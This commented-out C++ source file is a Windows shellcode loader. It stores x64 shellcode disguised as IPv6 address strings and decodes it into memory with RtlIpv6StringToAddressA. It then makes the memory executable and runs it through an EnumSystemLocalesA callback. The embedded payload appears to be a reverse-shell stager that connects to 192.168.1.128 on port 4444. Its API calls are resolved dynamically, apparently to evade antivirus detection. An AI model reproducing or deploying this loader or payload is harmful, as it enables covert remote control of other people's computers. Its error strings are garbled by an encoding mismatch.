// #include <iostream>
// #include <Windows.h>
// #include <ip2string.h>
// #include <ntstatus.h>
// #pragma comment(lib, "Ntdll.lib")
//
// int main(int argc, char* argv) {
// 	const char* ipv6[] = { "fc48:83e4:f0e8:cc00:0:4151:4150:5248","31d2:6548:8b52:6051:5648:8b52:1848:8b52","204d:31c9:488b:7250:480f:b74a:4a48:31c0","ac3c:617c:22c:2041:c1c9:d41:1c1:e2ed","5248:8b52:208b:423c:4801:d066:8178:180b","241:510f:8572:0:8b:8088:0:48","85c0:7467:4801:d050:448b:4020:8b48:1849","1d0:e356:48ff:c94d:31c9:418b:3488:4801","d648:31c0:ac41:c1c9:d41:1c1:38e0:75f1","4c03:4c24:845:39d1:75d8:5844:8b40:2449","1d0:6641:8b0c:4844:8b40:1c49:1d0:418b","488:4158:4801:d041:585e:595a:4158:4159","415a:4883:ec20:4152:ffe0:5841:595a:488b","12e9:4bff:ffff:5d49:be77:7332:5f33:3200","41:5649:89e6:4881:eca0:100:49:89e5","49bc:200:115c:c0a8:180:4154:4989:e44c","89f1:41ba:4c77:2607:ffd5:4c89:ea68:101","0:5941:ba29:806b:ff:d56a:a41:5e50","504d:31c9:4d31:c048:ffc0:4889:c248:ffc0","4889:c141:baea:fdf:e0ff:d548:89c7:6a10","4158:4c89:e248:89f9:41ba:99a5:7461:ffd5","85c0:740a:49ff:ce75:e5e8:9300:0:4883","ec10:4889:e24d:31c9:6a04:4158:4889:f941","ba02:d9c8:5fff:d583:f800:7e55:4883:c420","5e89:f66a:4041:5968:10:0:4158:4889","f248:31c9:41ba:58a4:53e5:ffd5:4889:c349","89c7:4d31:c949:89f0:4889:da48:89f9:41ba","2d9:c85f:ffd5:83f8:7d:2858:4157:5968","40:0:4158:6a00:5a41:ba0b:2f0f:30ff","d557:5941:ba75:6e4d:61ff:d549:ffce:e93c","ffff:ff48:1c3:4829:c648:85f6:75b4:41ff","e758:6a00:5949:c7c2:f0b5:a256:ffd5:0" };
// 	int group = std::size(ipv6);
//
// 	typedef LPVOID(WINAPI* oldVirtualAlloc)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flAllocationType,DWORD  flProtect);
// 	oldVirtualAlloc VA = (oldVirtualAlloc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
// 	LPVOID handle = VA(0, group * 16, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
// 	if(handle == NULL) {
// 		std::cout << "ÉêÇëÄÚ´æÊ§°Ü" << std::endl;
// 		return -1;
// 	}
//
// 	DWORD_PTR rwxpage = (DWORD_PTR)handle;
// 	PCSTR terminator;
// 	for (int i = 0; i < group; i++) {
// 		// std::cout << ipv6[i] << std::endl;
// 		// std::cout << (in6_addr*)rwxpage << std::endl;
// 		NTSTATUS res = RtlIpv6StringToAddressA(ipv6[i], &terminator, (in6_addr*)rwxpage);
// 		if (res != STATUS_SUCCESS) {
// 			std::cout << "ÄÚ´æ×ª»»Ê§°Ü" << std::endl;
// 			CloseHandle(handle);
// 			return -1;
// 		}
// 		rwxpage += 16;
// 	}
//
//
// 	DWORD oldProtect;
// 	typedef BOOL(WINAPI* oldVirtualProtect)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);
// 	oldVirtualProtect VP = (oldVirtualProtect)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualProtect");
// 	VP(handle, group * 16, PAGE_EXECUTE_READWRITE, &oldProtect);
// 	EnumSystemLocalesA((LOCALE_ENUMPROCA)handle, 0);
// 	CloseHandle(handle);
// 	return 0;
// }
